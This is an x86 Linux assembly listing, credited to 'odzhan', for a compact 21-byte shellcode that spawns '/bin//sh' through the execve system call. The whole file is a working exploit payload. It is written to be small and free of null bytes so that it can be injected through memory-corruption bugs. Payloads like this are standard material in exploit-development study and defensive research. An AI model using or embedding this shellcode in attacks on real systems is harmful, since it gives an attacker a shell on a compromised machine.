

; 21 byte execve("/bin//sh", 0, 0) for linux/x86
; odzhan

    bits 32
    
start:
    xor     ecx, ecx
    mul     ecx
    push    edx                ; '\0'
    push    0x68732f2f	       ; "hs//"
    push    0x6e69622f	       ; "nib/"
    push    esp
    pop     ebx
    mov     al, 11
    int     0x80